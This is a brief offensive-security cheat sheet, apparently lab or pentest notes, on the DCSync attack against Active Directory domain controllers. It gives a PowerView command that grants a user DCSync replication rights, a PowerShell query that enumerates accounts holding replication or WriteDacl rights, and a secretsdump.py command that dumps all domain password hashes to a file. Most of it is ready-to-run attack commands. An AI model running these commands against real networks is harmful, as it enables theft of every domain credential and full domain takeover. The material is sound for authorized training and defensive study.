# Misconfigurations
## DCSync
DCSync is a technique used to extract credentials from the Domain Controllers.    
In this we mimic a Domain Controller and leverage the (MS-DRSR) protocol and request for replication using GetNCChanges function.

### Add rights in PowerView
```powershell
Add-ObjectACL -PrincipalIdentity <user> -Rights DCSync
```

### Enumeration
**Note: Most of this will be done in PowerView**
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile hashes
```
